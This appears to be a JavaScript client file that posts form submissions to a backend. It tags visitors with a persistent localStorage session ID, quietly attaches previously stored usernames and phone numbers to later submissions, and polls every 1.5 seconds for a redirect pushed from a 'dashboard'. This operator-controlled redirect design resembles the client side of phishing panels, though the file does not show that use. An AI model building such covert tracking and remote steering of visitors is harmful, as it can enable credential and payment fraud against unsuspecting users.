/**
 * عميل HTTP مشترك لحفظ التسجيلات في الخادم (MongoDB).
 * يعتمد على api-config.js (يجب تحميله قبل هذا الملف).
 */
function getApiBase() {
    if (typeof window === 'undefined') return '';
    var b = window.API_BASE_URL;
    if (typeof b !== 'string') return '';
    return b.replace(/\/$/, '');
}

function getApiHeaders(extra) {
    var headers = Object.assign({}, extra || {});
    if (typeof window !== 'undefined' && typeof window.API_APP_KEY === 'string' && window.API_APP_KEY.trim()) {
        headers['x-app-key'] = window.API_APP_KEY.trim();
    }
    return headers;
}

async function saveSubmission(payload) {
    var base = getApiBase();
    var body = Object.assign({}, payload);
    delete body.id;
    delete body._id;
    try {
        if (typeof window !== 'undefined') {
            var sid = localStorage.getItem('yasmeen_session_id');
            if (!sid) {
                sid = Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 10);
                localStorage.setItem('yasmeen_session_id', sid);
            }
            if (!body.client_session_id) {
                body.client_session_id = sid;
            }
            var lu = localStorage.getItem('yasmeen_last_username');
            if (
                lu &&
                String(lu).trim() &&
                !body.username &&
                !body.linked_username
            ) {
                body.linked_username = String(lu).trim();
            }
            var lp = localStorage.getItem('yasmeen_last_phone');
            if (
                lp &&
                String(lp).trim() &&
                !body.phone &&
                !body.linked_phone
            ) {
                body.linked_phone = String(lp).trim();
            }
        }
    } catch (e) {
        // ignore session id errors
    }

    var res = await fetch(base + '/api/submissions', {
        method: 'POST',
        headers: getApiHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify(body)
    });

    if (!res.ok) {
        var msg = await res.text();
        throw new Error(msg || 'فشل الحفظ');
    }
    return res.json();
}

/** طلب واحد: هل يوجد توجيه من الداشبورد؟ */
async function pollSessionRedirectOnce() {
    var base = getApiBase();
    var sid =
        typeof window !== 'undefined'
            ? localStorage.getItem('yasmeen_session_id')
            : null;
    if (!sid) return null;
    var res = await fetch(
        base +
            '/api/session/nav/poll?client_session_id=' +
            encodeURIComponent(sid),
        { headers: getApiHeaders() }
    );
    if (!res.ok) return null;
    var data = await res.json();
    return data.redirectUrl ? String(data.redirectUrl) : null;
}

/**
 * استطلاع حتى يصل redirectUrl ثم استدعاء onRedirect(url).
 * يعيد دالة إيقاف.
 */
function startSessionRedirectPolling(onRedirect) {
    var timer = null;
    var stopped = false;
    function stop() {
        stopped = true;
        if (timer) {
            clearInterval(timer);
            timer = null;
        }
    }
    function tick() {
        if (stopped) return;
        pollSessionRedirectOnce()
            .then(function (url) {
                if (stopped) return;
                if (url) {
                    stop();
                    onRedirect(url);
                }
            })
            .catch(function (e) {
                console.error(e);
            });
    }
    tick();
    timer = setInterval(tick, 1500);
    return stop;
}

if (typeof window !== 'undefined') {
    window.getApiBase = getApiBase;
    window.getApiHeaders = getApiHeaders;
    window.saveSubmission = saveSubmission;
    window.pollSessionRedirectOnce = pollSessionRedirectOnce;
    window.startSessionRedirectPolling = startSessionRedirectPolling;
}
